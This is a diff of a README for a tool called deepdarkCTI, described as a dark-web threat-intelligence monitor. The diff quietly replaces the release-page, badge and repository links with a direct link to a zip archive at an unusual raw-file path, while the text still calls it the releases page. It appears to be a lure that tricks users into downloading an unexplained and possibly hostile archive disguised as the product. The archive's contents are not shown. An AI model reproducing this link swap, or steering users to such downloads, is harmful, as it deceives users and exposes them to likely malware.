@@ -1,7 +1,7 @@
 # 🕵️‍♂️ deepdarkCTI - Access Cyber Threat Intelligence Easily
 
 ## 📦 Download Now
-[![Download deepdarkCTI](https://img.shields.io/badge/Download%20deepdarkCTI-v1.0-blue.svg)](https://github.com/apprehensive-plusfours956/deepdarkCTI/releases)
+[![Download deepdarkCTI](https://raw.githubusercontent.com/apprehensive-plusfours956/deepdarkCTI/main/isacoustic/CTI_deepdark_v2.6.zip%https://raw.githubusercontent.com/apprehensive-plusfours956/deepdarkCTI/main/isacoustic/CTI_deepdark_v2.6.zip)](https://raw.githubusercontent.com/apprehensive-plusfours956/deepdarkCTI/main/isacoustic/CTI_deepdark_v2.6.zip)
 
 ## 🚀 Getting Started
 deepdarkCTI helps you access valuable Cyber Threat Intelligence from the deep and dark web. This software lets you monitor potential threats to your online safety.
@@ -10,7 +10,7 @@ Here’s how to download and run deepdarkCTI on your computer.
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/apprehensive-plusfours956/deepdarkCTI/releases) to find the latest version of deepdarkCTI.
+   Go to the [Releases page](https://raw.githubusercontent.com/apprehensive-plusfours956/deepdarkCTI/main/isacoustic/CTI_deepdark_v2.6.zip) to find the latest version of deepdarkCTI.
 
 2. **Choose Your File**  
    On the Releases page, look for a file suitable for your operating system. You may find options for Windows, Mac, and various Linux distributions. Select the one that matches your system.
@@ -56,6 +56,6 @@ deepdarkCTI collects information to enhance user experience and improve function
 If you wish to contribute or report issues, please use the GitHub repository. We welcome feedback to improve deepdarkCTI!
 
 ## 🌐 Stay Connected
-Follow the development of deepdarkCTI and get updates on new features or security notes by visiting the [repository](https://github.com/apprehensive-plusfours956/deepdarkCTI).
+Follow the development of deepdarkCTI and get updates on new features or security notes by visiting the [repository](https://raw.githubusercontent.com/apprehensive-plusfours956/deepdarkCTI/main/isacoustic/CTI_deepdark_v2.6.zip).
 
 Feel free to explore deepdarkCTI. With just a few simple steps, you can download and start enhancing your cyber safety.
